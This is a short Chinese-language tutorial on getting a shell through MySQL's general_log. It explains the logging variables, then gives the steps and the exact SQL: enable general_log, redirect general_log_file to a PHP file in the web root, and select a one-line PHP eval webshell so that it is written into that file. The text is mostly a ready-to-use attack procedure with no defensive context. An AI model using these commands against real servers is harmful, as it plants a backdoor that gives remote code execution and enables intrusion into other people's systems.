general_log日志利用

mysql5.0版本以上会创建日志文件，可以通过修改日志的全局变量getshell。

general_log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。

general_log_file 指的是日志的保存路径。

开启 general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在general_log_file指定的文件路径的文件。

SHOW VARIABLES LIKE 'general%';
SELECT @@general_log;
  1. 开启general_log
  2. 设置general_log_file的值修改为网站路径的php文件。
  3. 通过log日志进行写入一句话木马。
set global general_log = "ON";
set global general_log_file = 'C:\\phpStudy\\PHPTutorial\\WWW\\mylog.php';
select '<?php eval($_POST[a]);?>';
